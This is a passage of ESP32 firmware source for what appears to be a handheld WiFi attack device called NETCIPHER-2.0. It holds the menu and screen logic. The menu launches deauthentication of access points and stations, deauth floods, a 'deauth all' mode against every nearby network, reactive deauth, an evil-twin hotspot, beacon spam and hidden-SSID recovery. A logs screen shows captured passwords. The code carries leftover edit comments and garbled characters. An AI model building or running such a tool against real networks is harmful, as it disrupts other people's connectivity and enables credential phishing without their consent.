    performDeepSleep();
    return;
   }

    // Apply debounce only to physical buttons, not virtual buttons
    bool isPhysicalButton = (digitalRead(BUTTON_UP) == LOW || digitalRead(BUTTON_DOWN) == LOW || 
                             digitalRead(BUTTON_OK) == LOW || digitalRead(BUTTON_BACK) == LOW);
    if (isPhysicalButton && currentMillis - lastButtonPress < debounceTime) return;
    
    if (currentScreen == SCREEN_MAIN) {
        if (digitalRead(BUTTON_UP) == LOW || vBtn_UP) {
            vBtn_UP = false;
            selectedItemIndex = (selectedItemIndex - 1 + mainMenuCount) % mainMenuCount;
            if (selectedItemIndex < scrollOffset) {
                scrollOffset = selectedItemIndex;
            } else if (selectedItemIndex >= scrollOffset + visibleItems) {
                scrollOffset = selectedItemIndex - visibleItems + 1;
            }
            lastButtonPress = currentMillis;
        }
        if (digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) {
            vBtn_DOWN = false;
            selectedItemIndex = (selectedItemIndex + 1) % mainMenuCount;
            if (selectedItemIndex < scrollOffset) {
                scrollOffset = selectedItemIndex;
            } else if (selectedItemIndex >= scrollOffset + visibleItems) {
                scrollOffset = selectedItemIndex - visibleItems + 1;
            }
            lastButtonPress = currentMillis;
        }
        if (digitalRead(BUTTON_OK) == LOW || vBtn_OK) {
            vBtn_OK = false;
            lastButtonPress = currentMillis;
            if (selectedItemIndex == 0) {
                // Show scanning message
             u8g2.clearBuffer();
             u8g2.setFont(u8g2_font_8x13_tf);
             u8g2.drawStr(5, 12, "SCANNING");
             u8g2.drawLine(0, 15, 127, 15);
             u8g2.sendBuffer();
    
            performScan();  // Sync scan - blocks until complete
    
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
            } else if (selectedItemIndex == 1) {
                currentScreen = SCREEN_SELECT_MENU;
                selectMenuIndex = 0;
                ssidListStartIdx = 0;
                scrollOffset = 0;
            } else if (selectedItemIndex == 2) {
                currentScreen = SCREEN_ATTACK;
                attackMenuIndex = (hasSelectedTargets() || getSelectedStationCount() > 0) ? 0 : 3;
                scrollOffset = 0;
            } else if (selectedItemIndex == 3) {
                if (isScanningStations) {
                 stopStationScan();
                  }
                  if (deauthMonitorActive) {
                   stopDeauthMonitor();
                   }
    
    // Set to AP mode only
                WiFi.mode(WIFI_AP);
                delay(10);
                currentScreen = SCREEN_DEAUTHER;
            } else if (selectedItemIndex == 4) {
                startStationScan();
            } else if (selectedItemIndex == 5) {
                if (scannedStationCount > 0) {
                    currentScreen = SCREEN_STATION_SELECT;
                    stationSelectIndex = 0;
                    stationSelectStartIdx = 0;
                } else {
                    u8g2.clearBuffer();
                    u8g2.setFont(u8g2_font_8x13_tf);
                    u8g2.drawStr(5, 20, "NO STATIONS");
                    u8g2.drawLine(0, 23, 127, 23);
                    
                    u8g2.sendBuffer();
                    delay(1500);
                }
            } else if (selectedItemIndex == 6) {
                currentScreen = SCREEN_LOGS;
                logScrollOffset = 0;
                selectedLogIndex = 0;
                scrollOffset = 0;
            
            } else if (selectedItemIndex == 7) {
                performDeauthMonitorSyncScan();
                
            } else if (selectedItemIndex == 8) {  // Hidden SSID
    // Check if any APs are selected
    if (!hasSelectedTargets()) {
        showNoTargetMessage();
        return;
    }
    
    // Find the first selected hidden AP
    bool foundHidden = false;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i])) {
            // Skip visible networks (those with SSID)
            if (_networks[i].ssid.length() > 0) {
                continue;
            }
            
            // Found a hidden AP
            memcpy(hiddenTargetBSSID, _networks[i].bssid, 6);
            hiddenTargetChannel = _networks[i].ch;
            startHiddenRecovery();
            foundHidden = true;
            break;
        }
    }
    
    if (!foundHidden) {
        // No hidden APs selected, show message
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_8x13_tf);
        u8g2.drawStr(5, 20, "NO HIDDEN AP");
        u8g2.drawLine(0, 23, 127, 23);
       
        u8g2.sendBuffer();
        delay(1500);
    }
} else if (selectedItemIndex == 9) { // Deauth Flood
                deauthing_active = false;
              
                apDeauthActive = false;
                stationDeauthActive = false;
                attack_running = false;
                resetDeauthIndices();  
                if (isScanningStations) stopStationScan();
                if (deauthMonitorActive) stopDeauthMonitor();
                if (hiddenRecoveryActive) stopHiddenRecovery();
               
    
                // Check if at least one target is selected
                if (!hasSelectedTargets()) {
                    showNoTargetMessage();
                    return;
                }
                
                // Reset flood counters
                flood_packet_count = 0;
                flood_success_count = 0;
                flood_consecutive_failures = 0;
                flood_last_packet_time = 0;
                flood_current_pattern = 0;
                flood_active = true;
                WiFi.softAPdisconnect(false);
    
                // Ensure WiFi is in AP mode for raw packet transmission
                esp_wifi_set_mode(WIFI_MODE_AP);
                esp_wifi_start();
    
                currentScreen = SCREEN_DEAUTH_FLOOD;
                } else if (selectedItemIndex == 10) { // Deauth All
                u8g2.drawBox(119, 1, 8, 8);
                
                u8g2.sendBuffer();
                deauthing_active = false;
               
                apDeauthActive = false;
                stationDeauthActive = false;
                attack_running = false;
                if (isScanningStations) stopStationScan();
                if (deauthMonitorActive) stopDeauthMonitor();
                if (hiddenRecoveryActive) stopHiddenRecovery();
                if (flood_active) flood_active = false;
               
                WiFi.softAPdisconnect(false);
                delay(100);
                // Perform initial scan
                scanDeauthAllNetworks();
    
                if (deauthAllNetworkCount > 0) {
                    deauthAllActive = true;
                    deauthAllCurrentIndex = 0;
                    deauthAllApStartTime = millis();
                    deauthAllLastScan = millis();
                    deauthAllPacketCount = 0;
                    
                    // Ensure WiFi is in AP mode for raw packet transmission
                    esp_wifi_set_mode(WIFI_MODE_AP);
                    esp_wifi_start();
                    
                    currentScreen = SCREEN_DEAUTH_ALL;
                } else {
                    // No networks found, show message briefly
                    u8g2.clearBuffer();
                    u8g2.setFont(u8g2_font_8x13_tf);
                    u8g2.drawStr(5, 20, "NO NETWORKS");
                    u8g2.drawLine(0, 23, 127, 23);
                   
                    u8g2.sendBuffer();
                    delay(1500);
                }
            } else if (selectedItemIndex == 11) { // REACTIVE
    WiFi.softAPdisconnect(true);
    delay(100);
    startReactiveDeauth();
}
else if (selectedItemIndex == 12) {  // AC DETECTOR position
    apDeauthActive = false;
    stationDeauthActive = false;
    combinedDeauthActive = false;
    flood_active = false;
    deauthAllActive = false;
    if (beaconSpam.running) beaconSpam.stop();
    if (deauthMonitorActive) stopDeauthMonitor();
    if (isScanningStations) stopStationScan();
    if (hiddenRecoveryActive) stopHiddenRecovery();
    
    // Initialize and switch to AC detector screen
    initACDetector();
    currentScreen = SCREEN_AC_DETECTOR;
    lastButtonPress = currentMillis;
}
else if (selectedItemIndex == 13) {  // CLOCK
    currentScreen = SCREEN_CLOCK;
} else if (selectedItemIndex == 14) {  // NEARBY SCAN
    startNearbyScan();
} else if (selectedItemIndex == 15) {          // REBOOT
                performReboot();
          } else if (selectedItemIndex == 16) {          // SLEEP
                performDeepSleep();
          }
        }
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            // Handle back button in main menu if needed
            lastButtonPress = currentMillis;
        }
    
        drawMainMenu();
    }
    
    else if (currentScreen == SCREEN_HIDDEN_RECOVER) {
        drawHiddenRecoverScreen();
        
       
        // Check if SSID found – delay 1 second before switching to success screen
       static unsigned long ssidFoundTime = 0;
       if (hiddenRecoveredSSID.length() > 0) {
       if (ssidFoundTime == 0) {
        ssidFoundTime = millis();   // start 1-second timer
    }
       if (millis() - ssidFoundTime >= 1000) {
        stopHiddenRecovery();
        currentScreen = SCREEN_HIDDEN_SUCCESS;
        ssidFoundTime = 0;          // reset for next hidden AP
    }
} else {
    ssidFoundTime = 0;              // reset if SSID not found yet
}
        
        // Check timeout
        // Check timeout
if (millis() - hiddenRecoveryStartTime >= HIDDEN_SCAN_DURATION) {
    stopHiddenRecovery();
    hiddenRecoveryIndex++;
    
    // Count total selected hidden APs
    int totalHidden = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i]) && _networks[i].ssid.length() == 0) {
            totalHidden++;
        }
    }
    
    if (hiddenRecoveryIndex < totalHidden) {
        startNextHiddenRecovery();
    } else {
        // All hidden APs processed â€“ return to main menu
        hiddenRecoveryIndex = 0;
        currentScreen = SCREEN_MAIN;
    }
}
        
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            stopHiddenRecovery();
            currentScreen = SCREEN_MAIN;
            lastButtonPress = currentMillis;
        }
    }
    
    else if (currentScreen == SCREEN_HIDDEN_SUCCESS) {
    drawHiddenSuccessScreen();
    
    // Auto-advance to next hidden AP after 3 seconds
    static unsigned long successStartTime = 0;
    static bool waitingForNext = false;
    
    if (!waitingForNext) {
        successStartTime = millis();
        waitingForNext = true;
    }
    
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        // User wants to stop - clear everything
        hiddenRecoveredSSID = "";
        hiddenRecoveryIndex = 0;
        waitingForNext = false;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
        lastButtonPress = currentMillis;
    }
    else if (millis() - successStartTime >= 3000) {
    waitingForNext = false;
    // hiddenRecoveryIndex++;   // â† REMOVE THIS LINE
    
    int totalHidden = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i]) && _networks[i].ssid.length() == 0) {
            totalHidden++;
        }
    }
    
    if (totalHidden > 0) {     // â† CHANGE CONDITION
        hiddenRecoveredSSID = "";
        startNextHiddenRecovery();
    } else {
        hiddenRecoveredSSID = "";
        hiddenRecoveryIndex = 0;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
    }
}
}

    else if (currentScreen == SCREEN_SELECT_MENU) {
        int netCount = countNetworks();   // now counts by channel (includes hidden)
        
        if ((digitalRead(BUTTON_UP) == LOW || vBtn_UP) && netCount > 0) {
            vBtn_UP = false;
            selectMenuIndex = (selectMenuIndex - 1 + netCount) % netCount;
            if (selectMenuIndex < scrollOffset) scrollOffset = selectMenuIndex;
            else if (selectMenuIndex >= scrollOffset + visibleItems) scrollOffset = selectMenuIndex - visibleItems + 1;
            lastButtonPress = currentMillis;
        }
        if ((digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) && netCount > 0) {
            vBtn_DOWN = false;
            selectMenuIndex = (selectMenuIndex + 1) % netCount;
            if (selectMenuIndex < scrollOffset) scrollOffset = selectMenuIndex;
            else if (selectMenuIndex >= scrollOffset + visibleItems) scrollOffset = selectMenuIndex - visibleItems + 1;
            lastButtonPress = currentMillis;
        }
        if (digitalRead(BUTTON_OK) == LOW || vBtn_OK) {
            vBtn_OK = false;
            if (netCount > 0) {
                _networks[selectMenuIndex].selected = !_networks[selectMenuIndex].selected;
                Serial.println((_networks[selectMenuIndex].selected ? "Selected: " : "Deselected: ") + _networks[selectMenuIndex].ssid);
            }
            lastButtonPress = currentMillis;
        }
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            lastButtonPress = currentMillis;
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
        }

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_8x13_tf);
        u8g2.drawStr(5, 12, "SELECT");
        u8g2.drawLine(0, 15, 127, 15);
        u8g2.setFont(u8g2_font_7x13_tf);

        if (netCount == 0) {
          
        } else {
            for (int i = 0; i < visibleItems; i++) {
    int idx = i + scrollOffset;
    if (idx >= netCount) break;
    
    int y = 27 + (i * 11);
    
    // Build display string
    String displaySSID;
    if (_networks[idx].ssid.length() == 0) {
        displaySSID = "[HIDDEN]";
    } else {
        displaySSID = _networks[idx].ssid;
    }
    
    if (idx == selectMenuIndex) {
        u8g2.drawXBM(0, y - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT-3, verticalBar);
    }
    
    if (_networks[idx].selected) {
        u8g2.drawXBM(7, y - 8, 8, 8, checkmark);
    } else {
        u8g2.drawFrame(7, y - 8, 8, 8);
    }
    
    // SCROLLING TEXT FOR LONG SSIDs
    // SCROLLING TEXT FOR LONG SSIDs - CONTINUOUS VERSION
if (idx == selectMenuIndex && displaySSID.length() > 14) {
    if (scrollingSSID != displaySSID) {
        scrollingSSID = displaySSID;
        scrollPos = 0;
        lastScrollUpdate = millis();
    }
    // Update scroll position continuously
    if (millis() - lastScrollUpdate > 150) {  // 150ms for smooth scrolling
        scrollPos++;
        // Loop back to beginning when reaching the end
        if (scrollPos > displaySSID.length() + 5) {
            scrollPos = 0;
        }
        lastScrollUpdate = millis();
    }
    // Create scrolling window - no extra spaces for pause
    String toShow = displaySSID.substring(scrollPos, scrollPos + 14);
    // If we're near the end, pad with spaces
    if (toShow.length() < 14) {
        toShow += "              "; // add spaces at the end
        toShow = toShow.substring(0, 14);
    }
    u8g2.drawStr(20, y, toShow.c_str());
} else {
    u8g2.drawStr(20, y, displaySSID.substring(0, 14).c_str());
}
}
            
        }
        u8g2.sendBuffer();
    }
    
    else if (currentScreen == SCREEN_STATION_SELECT) {
        if ((digitalRead(BUTTON_UP) == LOW || vBtn_UP) && scannedStationCount > 0) {
            vBtn_UP = false;
            stationSelectIndex = (stationSelectIndex - 1 + scannedStationCount) % scannedStationCount;
            if (stationSelectIndex < stationSelectStartIdx) {
                stationSelectStartIdx = stationSelectIndex;
            }
            if (stationSelectIndex >= stationSelectStartIdx + 4) {
                stationSelectStartIdx = stationSelectIndex - 3;
            }
            lastButtonPress = currentMillis;
        }
        
        if ((digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) && scannedStationCount > 0) {
            vBtn_DOWN = false;
            stationSelectIndex = (stationSelectIndex + 1) % scannedStationCount;
            if (stationSelectIndex >= stationSelectStartIdx + 4) {
                stationSelectStartIdx = stationSelectIndex - 3;
            }
            if (stationSelectIndex < stationSelectStartIdx) {
                stationSelectStartIdx = stationSelectIndex;
            }
            lastButtonPress = currentMillis;
        }
        
        if ((digitalRead(BUTTON_OK) == LOW || vBtn_OK) && scannedStationCount > 0) {
            vBtn_OK = false;
            stationSelected[stationSelectIndex] = !stationSelected[stationSelectIndex];
            lastButtonPress = currentMillis;
        }
        
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            lastButtonPress = currentMillis;
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
        }
        
        drawStationSelectScreen();
    }
    
    else if (currentScreen == SCREEN_STATION_SCAN) {
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            if (isScanningStations) {
                stopStationScan();
            }
            lastButtonPress = currentMillis;
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
        }
        
        drawStationScanScreen();
    }
    
    else if (currentScreen == SCREEN_LOGS) {
        if ((digitalRead(BUTTON_UP) == LOW || vBtn_UP) && passwordLogCount > 0) {
            vBtn_UP = false;
            if (selectedLogIndex > 0) {
                selectedLogIndex--;
                if (selectedLogIndex < logScrollOffset) {
                    logScrollOffset = selectedLogIndex;
                }
            }
            lastButtonPress = currentMillis;
        }
        
        if ((digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) && passwordLogCount > 0) {
            vBtn_DOWN = false;
            if (selectedLogIndex < passwordLogCount - 1) {
                selectedLogIndex++;
                if (selectedLogIndex >= logScrollOffset + 4) {
                    logScrollOffset = selectedLogIndex - 3;
                }
            }
            lastButtonPress = currentMillis;
        }
        
        if ((digitalRead(BUTTON_OK) == LOW || vBtn_OK) && passwordLogCount > 0) {
            vBtn_OK = false;
            currentScreen = SCREEN_LOG_DETAIL;
            lastButtonPress = currentMillis;
        }
        
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            lastButtonPress = currentMillis;
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
        }
        
        drawLogsScreen();
    }
    
    else if (currentScreen == SCREEN_LOG_DETAIL) {
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            lastButtonPress = currentMillis;
            currentScreen = SCREEN_LOGS;
        }
        
        drawLogDetailScreen();
    }
    
    else if (currentScreen == SCREEN_DEAUTHER) {
    if (digitalRead(BUTTON_OK) == LOW || vBtn_OK) {
        vBtn_OK = false;
        if (hasSelectedTargets() || getSelectedStationCount() > 0) {
            // TOGGLE: If running, stop it; if stopped, start it
            if (attack_running || stationDeauthActive || apDeauthActive) {
                // STOP deauth attack
                stationDeauthActive = false;
                apDeauthActive = false;
                combinedDeauthActive = false;
                attack_running = false;
                deauthing_active = false;
                resetDeauthIndices();
                digitalWrite(LED_PIN, LOW);
                Serial.println("Deauth attack STOPPED");
            } else {
                // START deauth attack
                resetDeauthIndices();
                stationDeauthActive = (getSelectedStationCount() > 0);
                apDeauthActive = (hasSelectedTargets());
                attack_running = stationDeauthActive || apDeauthActive;
                deauthing_active = attack_running;
                
                if (attack_running) {
                    esp_wifi_set_mode(WIFI_MODE_AP);
                    esp_wifi_start();
                    Serial.println("Deauth attack STARTED");
                } else {
                    Serial.println("No targets or stations selected");
                }
            }
        } else {
            // Show message if no targets selected
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_8x13_tf);
            u8g2.drawStr(10, 35, "NO TARGETS");
            u8g2.drawStr(10, 50, "Select APs/Stations");
            u8g2.sendBuffer();
            delay(1500);
        }
        lastButtonPress = currentMillis;
    }

    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        lastButtonPress = currentMillis;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
    }

    drawDeauthScreen();
}
    else if (currentScreen == SCREEN_ATTACK) {
    if (digitalRead(BUTTON_UP) == LOW || vBtn_UP) {
        vBtn_UP = false;
        bool targetsSelected = (hasSelectedTargets() || getSelectedStationCount() > 0);
        if (targetsSelected) {
            attackMenuIndex = (attackMenuIndex - 1 + ATTACK_MENU_COUNT) % ATTACK_MENU_COUNT;
        } else {
            attackMenuIndex = 3;
        }
        if (attackMenuIndex < scrollOffset) {
            scrollOffset = attackMenuIndex;
        } else if (attackMenuIndex >= scrollOffset + visibleItems) {
            scrollOffset = attackMenuIndex - visibleItems + 1;
        }
        lastButtonPress = currentMillis;
    }
    if (digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) {
        vBtn_DOWN = false;
        bool targetsSelected = (hasSelectedTargets() || getSelectedStationCount() > 0);
        if (targetsSelected) {
            attackMenuIndex = (attackMenuIndex + 1) % ATTACK_MENU_COUNT;
        } else {
            attackMenuIndex = 3;
        }
        if (attackMenuIndex < scrollOffset) {
            scrollOffset = attackMenuIndex;
        } else if (attackMenuIndex >= scrollOffset + visibleItems) {
            scrollOffset = attackMenuIndex - visibleItems + 1;
        }
        lastButtonPress = currentMillis;
    }
    if (digitalRead(BUTTON_OK) == LOW || vBtn_OK) {
        vBtn_OK = false;
        lastButtonPress = currentMillis;
        if (attackMenuIndex == 0) {
            apDeauthActive = !apDeauthActive;
            if (apDeauthActive) {
                WiFi.disconnect(true);
                delay(100);
                WiFi.mode(WIFI_AP);
                delay(100);
                esp_wifi_set_mode(WIFI_MODE_AP);
                esp_wifi_start();
                deauthing_active = true;
                attack_running = true;
                currentApDeauthIndex = 0;
            } else {
                deauthing_active = false;
                attack_running = false;
            }
        } else if (attackMenuIndex == 1) {
            if (getSelectedStationCount() > 0) {
                stationDeauthActive = !stationDeauthActive;
                if (stationDeauthActive) {
                    WiFi.disconnect(true);
                    delay(100);
                    WiFi.mode(WIFI_AP);
                    delay(100);
                    esp_wifi_set_mode(WIFI_MODE_AP);
                    esp_wifi_start();
                    attack_running = true;
                } else {
                    attack_running = false;
                }
            }
        } else if (attackMenuIndex == 2) {
            if (!hotspot_active) {
                stationDeauthActive = false;
                attack_running = apDeauthActive;
                startEvilTwin();
            } else {
                stopEvilTwin();
            }
        } else if (attackMenuIndex == 3) {
            if (beaconSpam.running) {
                beaconSpam.stop();
                attack_running = false;
            } else {
                stopAllAttacks();
                beaconSpam.begin();
                beaconSpam.start();
                attack_running = true;
            }
        }
    }
    
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        resetDeauthIndices();
        lastButtonPress = currentMillis;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
    }
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_8x13_tf);
    u8g2.drawStr(5, 12, "ATTACK");
    u8g2.drawLine(0, 15, 127, 15);
    
    u8g2.setFont(u8g2_font_8x13_tf);
    
    String menuItems[ATTACK_MENU_COUNT] = { 
        "AP DEAUTH:" + String(apDeauthActive ? "ON" : "OFF"), 
        "STA DEAUTH:" + String(stationDeauthActive ? "ON" : "OFF"),
        "E-TWIN:" + String(hotspot_active ? "ON" : "OFF"),
        "B-SPAM:" + String(beaconSpam.running ? "ON" : "OFF")
    };
    
    bool targetsSelected = (hasSelectedTargets() || getSelectedStationCount() > 0);
    int drawIdx = 0;
    for (int idx = 0; idx < ATTACK_MENU_COUNT; idx++) {
        if (!targetsSelected && idx < 3) continue;
        
        int y = 27 + (drawIdx * 11);
        
        if (idx == attackMenuIndex) {
            u8g2.drawXBM(0, y - 8, VERTICAL_BAR_WIDTH, VERTICAL_BAR_HEIGHT-3, verticalBar);
        }
        
        u8g2.drawStr(10, y, menuItems[idx].c_str());
        drawIdx++;
    }
    
    u8g2.sendBuffer();
}
    else if (currentScreen == SCREEN_DEAUTH_FLOOD) {
        // Handle BACK button to stop flood
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            current_temp = 0.0;
            flood_active = false;
            resetDeauthIndices();  // â† ADD THIS LINE
            // ✅ ADD THIS - Restart the access point
            startAccessPoint();
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
            lastButtonPress = currentMillis;
        }
        
        // Draw the screen
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_8x13_tf);
        u8g2.drawStr(5, 12, "DEAUTH FLOOD");
        u8g2.drawLine(0, 15, 127, 15);
        u8g2.setFont(u8g2_font_6x10_tf);
        
        // Find first selected target
        String targetDisplay = "None";
        _Network* target = nullptr;
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected) {
                target = &_networks[i];
                if (_networks[i].ssid.length() > 0) {
                targetDisplay = _networks[i].ssid.substring(0, 10);
            } else {
                targetDisplay = "[HIDDEN]";
            }
                break;
            }
        }
        
        if (target) {
            String displaySSID;
            if (target->ssid.length() > 0) {
            displaySSID = target->ssid.substring(0, 20);
        } else {
            displaySSID = "[HIDDEN]";
        }
            u8g2.drawStr(0, 32, displaySSID.c_str());
            u8g2.drawStr(0, 47, "T:");          // Positioned at x=70, same y=47 as RD
            u8g2.setCursor(30, 47);
            u8g2.print(current_temp, 1);          // one decimal place
            
            u8g2.drawStr(0, 62, "Rate:");
            u8g2.setCursor(40, 62);
            u8g2.print(packetsPerSecond);
            u8g2.print(" p/s");
            
                      
        } else {
            u8g2.drawStr(10, 35, "NO TARGET");
           
        }
        
        u8g2.sendBuffer();
    }
    
    // ===== NEW: DEAUTH ALL SCREEN =====
    else if (currentScreen == SCREEN_DEAUTH_ALL) {
        // Back button stops Deauth All
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            deauthAllActive = false;
            resetDeauthIndices();  // â† ADD THIS LINE
            currentScreen = SCREEN_MAIN;
            // ✅ ADD THIS - Restart the access point
            startAccessPoint();
            scrollOffset = 0;
            selectedItemIndex = 0;
            lastButtonPress = currentMillis;
            digitalWrite(LED_PIN, LOW); // ensure LED off
        }
        
        drawDeauthAllScreen();
    }
    
    else if (currentScreen == SCREEN_DEAUTH_MONITOR) {
        drawDeauthMonitorScreen();
        
        // Handle OK button - toggle between automatic and manual mode
        if ((digitalRead(BUTTON_OK) == LOW || vBtn_OK) && (currentMillis - deauthMonitorLastButtonPress >= DEAUTH_MONITOR_DEBOUNCE)) {
            vBtn_OK = false;
            deauthMonitorAutomatic = !deauthMonitorAutomatic;  // Toggle mode
            deauthMonitorLastButtonPress = currentMillis;
            lastButtonPress = currentMillis;
            
            if (deauthMonitorAutomatic) {
                Serial.println("Deauth Monitor: Switched to AUTOMATIC mode");
            } else {
                Serial.println("Deauth Monitor: Switched to MANUAL mode");
            }
        }
        
        // Handle UP button - increase channel in manual mode
        if ((digitalRead(BUTTON_UP) == LOW || vBtn_UP) && !deauthMonitorAutomatic && (currentMillis - deauthMonitorLastButtonPress >= DEAUTH_MONITOR_DEBOUNCE)) {
            vBtn_UP = false;
            currentMonitorChannel++;
            if (currentMonitorChannel > 14) currentMonitorChannel = 1;  // Wrap around
            esp_wifi_set_channel(currentMonitorChannel, WIFI_SECOND_CHAN_NONE);
            deauthMonitorLastButtonPress = currentMillis;
            lastButtonPress = currentMillis;
            Serial.printf("Deauth Monitor Manual: Channel UP -> %d\n", currentMonitorChannel);
        }
        
        // Handle DOWN button - decrease channel in manual mode
        if ((digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) && !deauthMonitorAutomatic && (currentMillis - deauthMonitorLastButtonPress >= DEAUTH_MONITOR_DEBOUNCE)) {
            vBtn_DOWN = false;
            currentMonitorChannel--;
            if (currentMonitorChannel < 1) currentMonitorChannel = 14;  // Wrap around
            esp_wifi_set_channel(currentMonitorChannel, WIFI_SECOND_CHAN_NONE);
            deauthMonitorLastButtonPress = currentMillis;
            lastButtonPress = currentMillis;
            Serial.printf("Deauth Monitor Manual: Channel DOWN -> %d\n", currentMonitorChannel);
        }
        
        // Handle BACK button - stop monitoring and return to main
        if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
            vBtn_BACK = false;
            stopDeauthMonitor();
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
            lastButtonPress = currentMillis;
        }
    } else if (currentScreen == SCREEN_CLOCK) {
    static bool powerSave = false;
    
    if (digitalRead(BUTTON_OK) == LOW || vBtn_OK) {
        vBtn_OK = false;
        powerSave = !powerSave;
        powerSaveMode = powerSave;
        
        if (powerSave) {
            stopAllAttacks();
            stopAccessPoint();
            WiFi.setSleep(true);
            esp_wifi_set_ps(WIFI_PS_MAX_MODEM);
            Serial.println("Modem Sleep - WiFi off, Clock running");
        } else {
            WiFi.setSleep(false);
            startAccessPoint();
            Serial.println("Normal Mode ");
        }
        lastButtonPress = currentMillis;
    }
    
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        WiFi.setSleep(false);
        startAccessPoint();
        powerSaveMode = false;
        
        lastButtonPress = currentMillis;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
    }
    
    drawClockScreen();
}

else if (currentScreen == SCREEN_NEARBY_SCAN) {
    drawNearbyScanScreen();
    
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        stopNearbyScan();
        currentScreen = SCREEN_MAIN;
        lastButtonPress = currentMillis;
    }
    
    // Auto-stop after 60 seconds
    if (millis() - nearbyScanStartTime >= 60000) {
        stopNearbyScan();
    }
}

else if (currentScreen == SCREEN_NEARBY_RESULTS) {
    // OK button to select/deselect station (for deauth)
    if ((digitalRead(BUTTON_OK) == LOW || vBtn_OK) && scannedStationCount > 0) {
        vBtn_OK = false;
        stationSelected[nearbySelectedIndex] = !stationSelected[nearbySelectedIndex];
        lastButtonPress = currentMillis;
    }
    
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
        lastButtonPress = currentMillis;
    }
    
    if ((digitalRead(BUTTON_UP) == LOW || vBtn_UP) && scannedStationCount > 0) {
        vBtn_UP = false;
        nearbySelectedIndex = (nearbySelectedIndex - 1 + scannedStationCount) % scannedStationCount;
        if (nearbySelectedIndex < nearbyScrollOffset) nearbyScrollOffset = nearbySelectedIndex;
        lastButtonPress = currentMillis;
    }
    
    if ((digitalRead(BUTTON_DOWN) == LOW || vBtn_DOWN) && scannedStationCount > 0) {
        vBtn_DOWN = false;
        nearbySelectedIndex = (nearbySelectedIndex + 1) % scannedStationCount;
        if (nearbySelectedIndex >= nearbyScrollOffset + 4) nearbyScrollOffset = nearbySelectedIndex - 3;
        lastButtonPress = currentMillis;
    }
    
    drawNearbyResultsScreen();
}
// In menu() function, after other screen handlers (before the closing brace)
else if (currentScreen == SCREEN_AC_DETECTOR) {
    // Run the AC detector loop (blocks until BACK is pressed)
    runACDetectorLoop();
    
    // After returning, reset menu state
    currentScreen = SCREEN_MAIN;
    scrollOffset = 0;
    lastButtonPress = millis();
    
    // Turn off LED
    #ifdef AC_LED_PIN
        if (AC_LED_PIN >= 0) digitalWrite(AC_LED_PIN, LOW);
    #endif
}
else if (currentScreen == SCREEN_REACTIVE_DEAUTH) {
    if (digitalRead(BUTTON_BACK) == LOW || vBtn_BACK) {
        vBtn_BACK = false;
        if (reactiveDeauthActive) {
            stopReactiveDeauth();
        }
        lastButtonPress = currentMillis;
        currentScreen = SCREEN_MAIN;
        scrollOffset = 0;
        selectedItemIndex = 0;
    }
    drawReactiveDeauthScreen();
}
} // <-- This closes the menu() function

void setup() {
    Serial.begin(115200);
    u8g2.begin();
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_7x13_tf);
    int w = u8g2.getStrWidth("NETCIPHER-2.0");
